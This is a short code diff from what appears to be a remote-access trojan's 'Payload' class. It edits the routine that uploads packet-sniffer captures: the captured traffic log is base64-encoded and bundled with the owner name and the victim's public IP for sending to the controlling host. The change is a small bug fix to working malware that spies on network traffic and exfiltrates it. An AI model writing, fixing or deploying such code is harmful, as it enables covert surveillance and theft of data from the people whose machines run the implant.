@@ -1135,7 +1135,7 @@ class Payload():
                 elif 'upload' in mode:
                     log = globals()['packetsniffer'].log.getvalue()
                     if len(log):
-                        globals()['packetsniffer'].log.reset()
+                        globals()['packetsniffer'].log.seek(0)
                         host, port = self.connection.getpeername()
                         data = base64.b64encode(log)
                         json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
